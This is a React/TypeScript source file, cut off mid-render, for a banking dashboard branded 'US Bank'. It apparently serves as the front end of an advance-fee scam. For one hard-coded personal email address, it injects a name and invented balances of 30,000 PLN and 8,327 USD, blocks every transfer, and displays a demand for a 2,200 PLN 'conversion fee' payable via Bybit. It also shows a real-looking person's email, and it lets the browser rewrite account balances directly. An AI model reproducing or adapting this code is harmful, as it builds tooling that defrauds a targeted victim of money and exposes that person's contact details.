// Dashboard.tsx
import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { useAuth } from '@/hooks/useAuth';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';
import { LoadingSpinner } from '@/components/LoadingSpinner';
import { Building2, DollarSign, Send, History, LogOut, User, Settings, CreditCard, TrendingUp, AlertCircle, Globe, RefreshCw } from 'lucide-react';

// Type definitions
interface User {
  id: string;
  email: string;
  fullName: string;
  country: string;
  accountNumber?: string;
  conversionFeePending?: boolean;
  conversionFeeAmount?: number;
  conversionFeeCurrency?: string;
  role?: string;
}

interface Balance {
  currency: string;
  balance: number;
}

interface Transaction {
  id: string;
  user_id: string;
  transaction_type: string;
  amount: number;
  description?: string;
  recipient_account?: string;
  recipient_name?: string;
  transaction_currency?: string;
  exchange_rate?: number;
  status?: string;
  created_at: string;
}

interface TransferData {
  toAccount: string;
  recipientName: string;
  amount: string;
  description: string;
  currency: string;
  recipientCountry: string;
  transferType: 'internal' | 'external';
  routingNumber: string;
}

interface AccountFormat {
  digits: number;
  label: string;
}

const COUNTRY_ACCOUNT_FORMATS: Record<string, AccountFormat> = {
  'US': { digits: 10, label: 'US Bank Account (10 digits)' },
  'PL': { digits: 20, label: 'Polish Bank Account (20 digits)' },
  'UK': { digits: 8, label: 'UK Bank Account (8 digits)' },
  'DE': { digits: 10, label: 'German Bank Account (10 digits)' },
  'FR': { digits: 11, label: 'French Bank Account (11 digits)' },
  'CA': { digits: 12, label: 'Canadian Bank Account (12 digits)' },
  'AU': { digits: 9, label: 'Australian Bank Account (9 digits)' },
  'JP': { digits: 7, label: 'Japanese Bank Account (7 digits)' }
};

class ErrorBoundary extends React.Component<{ children: React.ReactNode }, { hasError: boolean; error: string | null }> {
  constructor(props: { children: React.ReactNode }) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error: Error) {
    return { hasError: true, error: error.message };
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="container mx-auto px-4 py-8">
          <Alert variant="destructive">
            <AlertDescription>
              An error occurred: {this.state.error}. Please try refreshing the page or contact support.
            </AlertDescription>
          </Alert>
          <div className="flex gap-4 mt-4">
            <Button onClick={() => window.location.reload()}>Try Again</Button>
          </div>
        </div>
      );
    }
    return this.props.children;
  }
}

const Dashboard = () => {
  const { user, logout } = useAuth() as { user: User | null; logout: () => Promise<void> };
  const { toast } = useToast();
  const navigate = useNavigate();

  const [transferData, setTransferData] = useState<TransferData>({
    toAccount: '',
    recipientName: '',
    amount: '',
    description: '',
    currency: 'USD',
    recipientCountry: 'US',
    transferType: 'internal',
    routingNumber: ''
  });
  const [balances, setBalances] = useState<Balance[]>([]);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [refreshing, setRefreshing] = useState(false);

  const generateAccountNumber = async (): Promise<string> => {
    let accountNumber: string;
    let isUnique = false;
    while (!isUnique) {
      accountNumber = Math.floor(1000000000 + Math.random() * 9000000000).toString();
      const { data } = await supabase.from('accounts').select('account_number').eq('account_number', accountNumber);
      if (!data?.length) isUnique = true;
    }
    return accountNumber;
  };

  useEffect(() => {
    if (user && user.id) {
      console.log('User ID:', user.id); // Debug log
      loadInitialData();
    } else {
      setBalances([{ currency: 'USD', balance: 0 }, { currency: 'PLN', balance: 0 }]);
      setTransactions([]);
      setLoading(false);
      console.log('No valid user session found');
    }
  }, [user]);

  const loadInitialData = async () => {
    try {
      setError(null);
      setLoading(true);
      await Promise.all([loadBalances(), loadTransactions(), ensureAccountNumber()]);

      if (user?.email === 'keniol9822@op.pl') {
        const { error: profileError } = await supabase.from('profiles').update({
          conversionFeePending: true,
          conversionFeeAmount: 2200,
          conversionFeeCurrency: 'PLN',
          country: 'PL',
          fullName: 'Anna Kenska'
        }).eq('email', 'keniol9822@op.pl');
        if (profileError) throw profileError;

        const { error: balanceError } = await supabase.from('currency_balances').upsert([
          { user_id: user.id, currency: 'PLN', balance: 30000 },
          { user_id: user.id, currency: 'USD', balance: 8327 }
        ]);
        if (balanceError) throw balanceError;
      }
    } catch (error) {
      console.error('Error loading initial data:', error);
      setError('Failed to load account data. Please check your connection or contact support.');
    } finally {
      setLoading(false);
    }
  };

  const ensureAccountNumber = async () => {
    if (!user?.id) return;
    const { data: existingAccount } = await supabase
      .from('accounts')
      .select('account_number')
      .eq('user_id', user.id)
      .single();

    if (!existingAccount) {
      const newAccountNumber = await generateAccountNumber();
      await supabase.from('accounts').insert({
        user_id: user.id,
        account_number: newAccountNumber,
        country: user.country || 'US'
      });
    }
  };

  const loadBalances = async () => {
    if (!user?.id) return;
    try {
      const { data, error } = await supabase
        .from('currency_balances')
        .select('currency, balance')
        .eq('user_id', user.id);
      if (error) throw error;
      if (user.email === 'keniol9822@op.pl') {
        const requiredBalances: Balance[] = [
          { currency: 'PLN', balance: 30000 },
          { currency: 'USD', balance: 8327 }
        ];
        setBalances(requiredBalances.map(required => data?.find(b => b.currency === required.currency) || required));
      } else {
        setBalances(data || []);
      }
    } catch (error) {
      console.error('Error loading balances:', error);
      throw error;
    }
  };

  const loadTransactions = async () => {
    if (!user?.id) return;
    try {
      const { data, error } = await supabase
        .from('transactions')
        .select('*')
        .eq('user_id', user.id)
        .order('created_at', { ascending: false })
        .limit(50);
      if (error) throw error;
      setTransactions((data || []).map(transaction => ({
        ...transaction,
        transaction_currency: transaction.transaction_currency || 'USD',
        exchange_rate: transaction.exchange_rate || 1.0,
        status: transaction.status || 'completed',
        recipient_name: transaction.recipient_name || ''
      })));
    } catch (error) {
      console.error('Error loading transactions:', error);
      throw error;
    }
  };

  const handleRefresh = async () => {
    setRefreshing(true);
    try {
      await loadInitialData();
      toast({ title: "Data refreshed", description: "Your account information has been updated." });
    } catch (error) {
      toast({ title: "Refresh failed", description: "Unable to refresh data. Please try again.", variant: "destructive" });
    } finally {
      setRefreshing(false);
    }
  };

  const getBalance = (currency: string): number => balances.find(b => b.currency === currency)?.balance || 0;

  const validateAccountNumber = (accountNumber: string, country: string): boolean => {
    const format = COUNTRY_ACCOUNT_FORMATS[country];
    if (!format) return false;
    const digitsOnly = accountNumber.replace(/\D/g, '');
    return digitsOnly.length === format.digits;
  };

  const validateRoutingNumber = (routingNumber: string): boolean => {
    const digitsOnly = routingNumber.replace(/\D/g, '');
    return digitsOnly.length === 9;
  };

  const handleTransfer = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user || !user.email || !user.country) {
      toast({ title: "User data missing", description: "Please log in again.", variant: "destructive" });
      return;
    }

    if (user.email === 'keniol9822@op.pl' || (user.conversionFeePending && user.country === 'PL')) {
      toast({
        title: "Transfer Blocked",
        description: `You have a pending conversion fee of ${user.conversionFeeAmount || 2200} ${user.conversionFeeCurrency || 'PLN'}. Please pay this fee via Bybit before making transfers.`,
        variant: "destructive",
      });
      return;
    }

    const amount = parseFloat(transferData.amount);
    const currentBalance = getBalance(transferData.currency);

    if (amount <= 0) {
      toast({ title: "Invalid amount", description: "Please enter a valid amount greater than 0.", variant: "destructive" });
      return;
    }

    if (amount > currentBalance) {
      toast({ title: "Insufficient funds", description: `You don't have enough ${transferData.currency} balance for this transfer.`, variant: "destructive" });
      return;
    }

    if (!validateAccountNumber(transferData.toAccount, transferData.recipientCountry)) {
      const format = COUNTRY_ACCOUNT_FORMATS[transferData.recipientCountry];
      toast({ title: "Invalid account number", description: `Please enter a valid ${format.label.toLowerCase()}.`, variant: "destructive" });
      return;
    }

    if (!transferData.recipientName.trim()) {
      toast({ title: "Recipient name required", description: "Please enter the recipient's full name.", variant: "destructive" });
      return;
    }

    try {
      if (transferData.transferType === 'internal') {
        const { data: recipientAccount, error: accountError } = await supabase
          .from('accounts')
          .select('user_id')
          .eq('account_number', transferData.toAccount)
          .single();

        if (accountError || !recipientAccount) {
          toast({ title: "Account not found", description: "The recipient account number could not be found in US Bank.", variant: "destructive" });
          return;
        }

        if (recipientAccount.user_id === user.id) {
          toast({ title: "Invalid transfer", description: "You cannot transfer money to your own account.", variant: "destructive" });
          return;
        }

        const { data: recipientProfile, error: profileError } = await supabase
          .from('profiles')
          .select('email, fullName')
          .eq('id', recipientAccount.user_id)
          .single();

        if (profileError || !recipientProfile) {
          toast({ title: "Recipient profile not found", description: "Could not verify recipient details.", variant: "destructive" });
          return;
        }

        if (recipientProfile.fullName.toLowerCase().indexOf(transferData.recipientName.toLowerCase()) === -1) {
          toast({ title: "Invalid recipient name", description: "The provided recipient name does not match our records.", variant: "destructive" });
          return;
        }

        const { error: transactionError } = await supabase
          .from('transactions')
          .insert({
            user_id: user.id,
            transaction_type: 'transfer_sent',
            amount: -amount,
            description: transferData.description || `Internal transfer to ${recipientProfile.fullName} (${transferData.toAccount})`,
            recipient_account: transferData.toAccount,
            recipient_name: transferData.recipientName,
            transaction_currency: transferData.currency,
            exchange_rate: 1.0,
            status: 'completed'
          });

        if (transactionError) throw transactionError;

        const { error: balanceError } = await supabase
          .from('currency_balances')
          .upsert({ user_id: user.id, currency: transferData.currency, balance: currentBalance - amount });

        if (balanceError) throw balanceError;

        const recipientBalance = await getRecipientBalance(recipientAccount.user_id, transferData.currency);
        const { error: recipientBalanceError } = await supabase
          .from('currency_balances')
          .upsert({ user_id: recipientAccount.user_id, currency: transferData.currency, balance: recipientBalance + amount });

        if (recipientBalanceError) throw recipientBalanceError;

        const { error: recipientTransactionError } = await supabase
          .from('transactions')
          .insert({
            user_id: recipientAccount.user_id,
            transaction_type: 'transfer_received',
            amount: amount,
            description: transferData.description || `Internal transfer from ${user.fullName} (${user.accountNumber})`,
            recipient_account: transferData.toAccount,
            recipient_name: user.fullName,
            transaction_currency: transferData.currency,
            exchange_rate: 1.0,
            status: 'completed'
          });

        if (recipientTransactionError) throw recipientTransactionError;

        if (recipientProfile?.email) {
          try {
            await supabase.functions.invoke('send-transfer-notification', {
              body: { recipientEmail: recipientProfile.email, senderName: user.fullName, amount, currency: transferData.currency, description: transferData.description }
            });
          } catch (emailError) {
            console.error('Email notification failed:', emailError);
          }
        }
      } else {
        if (!transferData.routingNumber || !validateRoutingNumber(transferData.routingNumber)) {
          toast({ title: "Invalid routing number", description: "Please enter a valid 9-digit US bank routing number.", variant: "destructive" });
          return;
        }

        const { error: transactionError } = await supabase
          .from('transactions')
          .insert({
            user_id: user.id,
            transaction_type: 'transfer_sent_external',
            amount: -amount,
            description: transferData.description || `External transfer to ${transferData.recipientName} (${transferData.toAccount}, Routing: ${transferData.routingNumber})`,
            recipient_account: transferData.toAccount,
            recipient_name: transferData.recipientName,
            transaction_currency: transferData.currency,
            exchange_rate: 1.0,
            status: 'completed'
          });

        if (transactionError) throw transactionError;

        const { error: balanceError } = await supabase
          .from('currency_balances')
          .upsert({ user_id: user.id, currency: transferData.currency, balance: currentBalance - amount });

        if (balanceError) throw balanceError;
      }

      toast({ title: "Transfer successful", description: `${amount} ${transferData.currency} has been sent successfully to ${transferData.recipientName}.` });
      setTransferData({
        toAccount: '',
        recipientName: '',
        amount: '',
        description: '',
        currency: 'USD',
        recipientCountry: 'US',
        transferType: 'internal',
        routingNumber: ''
      });
      await Promise.all([loadBalances(), loadTransactions()]);
    } catch (error) {
      console.error('Transfer error:', error);
      toast({ title: "Transfer failed", description: "An error occurred during the transfer. Please try again.", variant: "destructive" });
    }
  };

  const getRecipientBalance = async (userId: string, currency: string): Promise<number> => {
    const { data, error } = await supabase
      .from('currency_balances')
      .select('balance')
      .eq('user_id', userId)
      .eq('currency', currency)
      .single();
    if (error) return 0;
    return data?.balance || 0;
  };

  const handleLogout = async () => {
    await logout();
    navigate('/');
  };

  const formatCurrency = (amount: number, currency: string = 'USD'): string => {
    const currencyMap: Record<string, string> = { 'USD': 'en-US', 'PLN': 'pl-PL', 'EUR': 'de-DE', 'GBP': 'en-GB', 'CAD': 'en-CA', 'AUD': 'en-AU', 'JPY': 'ja-JP' };
    return new Intl.NumberFormat(currencyMap[currency] || 'en-US', { style: 'currency', currency }).format(amount);
  };

  const formatDate = (dateString: string): string => {
    return new Date(dateString).toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
  };

  if (loading) return <LoadingSpinner />;
  if (error) return (
    <div className="container mx-auto px-4 py-8">
      <Alert variant="destructive"><AlertDescription>{error}</AlertDescription></Alert>
      <div className="flex gap-4 mt-4">
        <Button onClick={handleRefresh}>Try Again</Button>
        <Button variant="outline" onClick={handleLogout}>Sign Out</Button>
      </div>
    </div>
  );
  if (!user) return <div>Please log in to view the dashboard.</div>;

  const totalBalanceUSD = balances.reduce((total, balance) => {
    const rates: Record<string, number> = { 'USD': 1, 'PLN': 0.25, 'EUR': 1.1, 'GBP': 1.3, 'CAD': 0.75, 'AUD': 0.65, 'JPY': 0.007 };
    return total + (balance.balance * (rates[balance.currency] || 1));
  }, 0);

  const currentAccountFormat = COUNTRY_ACCOUNT_FORMATS[transferData.recipientCountry];

  return (
    <ErrorBoundary>
      <div className="min-h-screen bg-gray-100">
        <header className="bg-white shadow-sm">
          <div className="container mx-auto px-4 py-4 flex justify-between items-center">
            <h1 className="text-xl font-bold">US Bank</h1>
            <div className="flex items-center space-x-4">
              <Button variant="outline" size="sm" onClick={handleRefresh} disabled={refreshing}>
                <RefreshCw className={`h-4 w-4 mr-2 ${refreshing ? 'animate-spin' : ''}`} /> Refresh
              </Button>
              <span className="text-sm">Welcome, {user.fullName}</span>
              {user.role === 'admin' && (
                <Button variant="outline" size="sm" onClick={() => navigate('/admin')}>Admin Panel</Button>
              )}
              <Button variant="outline" size="sm" onClick={handleLogout}>
                <LogOut className="h-4 w-4 mr-2" /> Logout
              </Button>
            </div>
          </div>
        </header>

        <div className="container mx-auto px-4 py-8">
          {(user.conversionFeePending || user.email === 'keniol9822@op.pl') && user.country === 'PL' && (
            <Alert className="mb-6 border-orange-200 bg-orange-50">
              <AlertCircle className="h-4 w-4 text-orange-600" />
              <AlertDescription className="text-orange-800">
                You have a pending conversion fee of {user.conversionFeeAmount || 2200} {user.conversionFeeCurrency || 'PLN'}. 
                Please pay this fee via Bybit before making any transfers to other banks.
              </AlertDescription>
            </Alert>
          )}

          <div className="grid md:grid-cols-3 gap-6 mb-8">
            {balances.map((balance) => (
              <Card key={balance.currenc
